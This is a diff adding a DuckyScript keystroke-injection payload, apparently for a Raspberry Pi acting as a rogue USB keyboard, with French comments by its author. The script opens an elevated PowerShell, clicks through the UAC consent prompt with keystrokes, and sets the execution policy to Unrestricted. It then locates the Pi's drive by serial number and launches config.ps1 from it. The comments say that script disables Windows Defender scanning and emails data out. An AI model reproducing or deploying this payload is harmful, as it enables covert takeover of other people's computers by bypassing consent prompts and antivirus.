@@ -1,0 +1,21 @@
+REM Gwendoline Dossegger
+REM Execute Powershell Admin
+REM 1) Désactive le scan de Windows Defender pour le stockage de la Pi
+REM 2) Envoi par mail le path du stockage de la Pi via un script Powershell
+DEFAULTDELAY 100
+GUI R
+STRING powershell Start-Process powershell -verb runas
+ENTER
+DELAY 500
+ARROW_L
+ENTER
+STRING Set-ExecutionPolicy Unrestricted -Force 2> Out-Null
+ENTER
+STRING $letter = "{0}:" -f (Get-Disk | Where-Object -FilterScript {$_.SerialNumber -Eq "fedcba9876543210"} | Get-Partition | Select-Object DriveLetter).DriveLetter
+ENTER
+DELAY 2000
+STRING Start-Job -FilePath $($letter+"\config.ps1") -ArgumentList $letter
+ENTER
+DELAY 4000
+STRING exit
+ENTER
